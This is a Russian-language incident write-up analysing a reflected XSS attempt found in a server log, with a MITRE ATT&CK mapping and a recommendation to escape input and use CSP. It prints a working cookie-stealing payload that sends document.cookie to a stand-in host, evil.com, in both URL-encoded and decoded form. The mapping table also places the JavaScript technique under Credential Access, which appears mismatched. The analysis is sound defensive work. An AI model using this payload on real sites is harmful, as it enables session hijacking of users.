# Анализ инцидента: XSS (Reflected Cross-Site Scripting)

## Обнаруженный лог

GET /search?q=%3Cimg%20src%3Dx%20onerror%3D%27fetch(%22http%3A%2F%2Fevil.com%2Fsteal%3Fcookie%3D%22%2Bdocument.cookie)%27%3E HTTP/1.1

## Декодированный пейлоад

`<img src=x onerror='fetch("http://evil.com/steal?cookie="+document.cookie)'>`

## Анализ

- **Тип атаки:** Reflected XSS (отраженная межсайтовая атака)
- **Механизм:** При загрузке страницы браузер пытается загрузить несуществующее изображение (src=x). Срабатывает событие `onerror`, которое выполняет JavaScript-код. Код отправляет cookie пользователя на сервер злоумышленника `evil.com`.
- **Условие успеха:** Жертва должна перейти по сформированной ссылке (например, через фишинговое письмо).
- **Код ответа 200:** Страница загрузилась, и вредоносный скрипт, скорее всего, выполнился.

## MITRE ATT&CK Mapping

| Тактика | Техника | Обоснование |
|---------|---------|-------------|
| TA0002 — Execution(исполнение) | T1204.001 — Malicious Link(вредоносная ссылка) | Пользователь должен перейти по ссылке |
| TA0006 — Credential Access(Доступ к учетным данным) | T1059.007 — JavaScript | Вредоносный код крадет cookie |

## Вывод

Обнаружена попытка кражи cookie через XSS. Атака требует взаимодействия пользователя (перехода по ссылке). Рекомендуется экранирование пользовательского ввода и внедрение Content Security Policy (CSP).
